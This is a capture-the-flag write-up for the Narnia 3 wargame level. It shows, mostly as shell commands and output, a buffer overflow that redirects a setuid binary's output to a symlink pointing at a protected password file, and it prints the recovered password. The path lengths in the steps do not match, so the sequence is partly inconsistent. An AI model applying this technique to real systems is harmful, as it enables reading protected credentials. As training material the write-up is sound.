# Writeup for Narnia 3

This was a slightly more tricky challenge, because we were reading from a random file

My first hurdle was that I had to somehow redirect the reading path from the current directory to /tmp and then I had to direct it to the file I created

So before I ran this exploit, I wanted to do some basic stuff
I needed to create my directory, which has to be 32 bytes to overflow the buffer. After that, whatever I write will overwrite /dev/null, and we can inject our own path in there. 

Cool, we have our task.
First I'll just create the necessary directories
```text
narnia3@narnia:/narnia$ python -c 'print "ABCD"*8'
ABCDABCDABCDABCDABCDABCDABCDABCD

narnia3@narnia:/narnia$ mkdir -p /tmp/ABCDABCDABCDABCDABCDABCDABCDABCD/tmp
```

Now that the directories are made, I'll just link the file
```text

narnia3@narnia:/narnia$ touch /tmp/ax
narnia3@narnia:/narnia$ chmod +rwx /tmp/ax

narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/ABCDABCDABCDABCDABCDABCDABCDABCD/tmp/ax
```

Now that everything is done, we need to send the control to /tmp/ABCDABCDABCDABCDABCDABCDABCDABCD/tmp/ax 
Cool

We can do that by first aligning our payload to make sure its 32 bytes.
Then it will copy the contents for us
```text
narnia3@narnia:/narnia$ ./narnia3 /tmp/ABCDABCDABCDABCDABCDABCDABC/tmp/ax
copied contents of /tmp/ABCDABCDABCDABCDABCDABCDABC/tmp/ax to a safer place... (/tmp/ax)
```
So as we can see, we've overwritten /dev/null with /tmp/ax which is a path that we control. Now we can just cat it out

```text
narnia3@narnia:/narnia$ cat /tmp/ax
thaenohtai
<Garbage>
```

We have the password to the next level
```text
thaenohtai
```

